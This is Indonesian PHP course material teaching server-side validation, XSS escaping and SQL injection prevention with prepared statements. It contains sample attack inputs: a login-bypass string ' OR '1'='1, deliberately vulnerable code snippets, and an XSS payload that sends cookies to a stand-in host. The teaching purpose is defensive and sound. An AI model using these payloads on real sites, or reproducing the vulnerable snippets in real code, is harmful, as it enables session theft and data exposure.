# Pertemuan 11 — Validasi Input Server-Side, Proteksi XSS & Pencegahan SQL Injection

> **Mata Kuliah:** Sistem Aplikasi Web (Backend Dasar) · **Fase:** Fitur Menengah (Pertemuan 11 dari 16)  
> **Bobot:** 3 SKS (1 Teori + 2 Praktikum) · **Level:** Pemula / Introductory Level  
> **CPMK2 & CPMK3:** Mahasiswa mampu mengamankan aplikasi web dari serangan umum SQL Injection dan Cross-Site Scripting (XSS) (C3)

---

## 1. Problem Statement (PBL)
> *"Pernahkah kamu mendengar peretas yang memasukkan teks `' OR '1'='1` ke dalam kolom login dan berhasil masuk tanpa mengetahui password? Atau memasukkan tag `<script>alert('diretas')</script>` ke kolom judul buku sehingga setiap pengunjung lain terkena popup berbahaya? Bagaimana cara skrip backend PHP memfilter input jahat tersebut?"*

---

## 2. Dua Ancaman Terbesar Aplikasi Web PHP Pemula

### 1. SQL Injection (SQLi)
Terjadi ketika input pengguna disatukan langsung ke teks query SQL string concatenation:
```php
// KODE BERBAHAYA (VULNERABLE):
$judul = $_POST['judul'];
$query = "SELECT * FROM buku WHERE judul = '$judul'"; 
// Jika attacker input: ' OR '1'='1
// Query menjadi: SELECT * FROM buku WHERE judul = '' OR '1'='1' (semua data bocor!)
```

**Solusi Standar PHP:** Gunakan **Prepared Statements & Parameterized Queries** (`mysqli_prepare` atau `PDO::prepare`). Database memperlakukan input pengguna murni sebagai data, bukan sebagai perintah kode SQL!

### 2. Cross-Site Scripting (XSS)
Terjadi ketika data yang dimasukkan pengguna dicetak langsung ke halaman HTML tanpa disanitasi:
```php
// KODE BERBAHAYA (VULNERABLE):
echo "Judul: " . $buku['judul'];
// Jika attacker input: <script>document.location='http://hacker.com/curi?cookie='+document.cookie</script>
```

**Solusi Standar PHP:** Gunakan selalu fungsi `htmlspecialchars($string, ENT_QUOTES, 'UTF-8')` setiap kali mencetak variabel ke layar browser HTML!

---

## 3. Fungsi Helper Sanitasi & Validasi: `config/helpers.php`
```php
<?php
// config/helpers.php

/**
 * Mencegah serangan XSS saat merender teks ke HTML
 */
function esc(string $str): string {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

/**
 * Validasi dan pembersihan string input
 */
function clean_input(string $data): string {
    $data = trim($data);
    $data = stripslashes($data);
    return $data;
}

/**
 * Memeriksa apakah input adalah angka bulat positif
 */
function is_positive_int($val): bool {
    return filter_var($val, FILTER_VALIDATE_INT) !== false && (int)$val > 0;
}
?>
```

---

## 4. Contoh Validasi Server-Side Kuat pada `tambah.php`
```php
<?php
require_once "config/koneksi.php";
require_once "config/helpers.php";

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $judul        = clean_input($_POST['judul'] ?? '');
    $pengarang    = clean_input($_POST['pengarang'] ?? '');
    $tahun_terbit = (int)($_POST['tahun_terbit'] ?? 0);
    $stok         = (int)($_POST['stok'] ?? 0);

    // 1. Validasi Keharusan (Required)
    if (empty($judul)) {
        $errors['judul'] = "Judul buku wajib diisi!";
    } elseif (strlen($judul) < 3) {
        $errors['judul'] = "Judul buku minimal harus 3 karakter.";
    }

    if (empty($pengarang)) {
        $errors['pengarang'] = "Nama pengarang wajib diisi!";
    }

    // 2. Validasi Batasan Nilai (Range)
    if ($tahun_terbit < 1900 || $tahun_terbit > (int)date('Y') + 1) {
        $errors['tahun_terbit'] = "Tahun terbit tidak valid (antara 1900 hingga " . (date('Y') + 1) . ").";
    }

    if ($stok < 0) {
        $errors['stok'] = "Stok tidak boleh berupa angka negatif.";
    }

    // 3. Jika tidak ada error sama sekali, baru simpan ke MySQL
    if (empty($errors)) {
        $stmt = mysqli_prepare($conn, "INSERT INTO buku (kategori_id, judul, pengarang, penerbit, tahun_terbit, stok) VALUES (?, ?, ?, ?, ?, ?)");
        mysqli_stmt_bind_param($stmt, "isssii", $_POST['kategori_id'], $judul, $pengarang, $_POST['penerbit'], $tahun_terbit, $stok);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);

        header("Location: index.php?pesan=" . urlencode("Buku berhasil divalidasi dan disimpan!"));
        exit;
    }
}
?>
```

---

## 5. Tugas Praktikum (RTM-11)
1. Buat file `config/helpers.php` dan sertakan fungsinya di seluruh berkas proyek.
2. Pasang fungsi `esc()` pada seluruh pencetakan variabel di `index.php` dan `edit.php`.
3. Coba masukkan judul buku berupa `<script>alert('Test XSS')</script>`. Pastikan browser hanya menampilkan teks tersebut secara harfiah dan tidak mengeksekusi popup script.
